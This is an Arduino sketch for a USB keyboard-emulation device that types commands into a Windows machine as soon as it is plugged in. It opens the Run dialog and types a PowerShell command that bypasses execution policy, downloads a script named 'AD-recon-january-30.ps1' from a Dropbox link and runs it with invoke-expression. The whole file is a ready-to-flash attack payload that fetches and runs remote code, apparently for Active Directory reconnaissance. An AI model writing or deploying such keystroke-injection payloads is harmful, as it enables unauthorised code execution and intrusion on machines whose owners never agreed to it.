#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);
  Keyboard.print("powershell -NoProfile -NonInteractive -Exec Bypass; $pl = iwr 'https://www.dropbox.com/scl/fi/654s02uzay0cbwgjhrviv/AD-recon-january-30.ps1?rlkey=6ejnge8w3rns2sx2mpz8jcts8&dl=1'; invoke-expression $pl");
  typeKey(KEY_RETURN);

  // Ending streamCMD
  
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}